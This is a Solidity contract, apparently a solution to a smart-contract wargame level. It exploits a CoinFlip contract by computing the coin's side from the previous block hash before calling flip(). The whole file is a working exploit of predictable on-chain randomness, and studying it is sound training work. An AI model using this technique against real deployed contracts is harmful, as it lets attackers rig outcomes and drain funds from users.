// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.0;

import "./CoinFlip.sol";
import "./SafeMath.sol";

contract AttackCoinFlip {
    using SafeMath for uint256;
    CoinFlip coinFlipAddr;
    uint256 blockNumber;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    event ConsecutiveWins(uint256 wins);
    event AttackResult(bool result, uint256 blockNumber);

    constructor(CoinFlip _addr) public {
        coinFlipAddr = _addr;
    }

    function attack() external returns (bool) {
        require(blockNumber < block.number, "Wait for next block");

        blockNumber = block.number;

        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        bool result = coinFlipAddr.flip(side);

        emit AttackResult(result, block.number);
    }
}
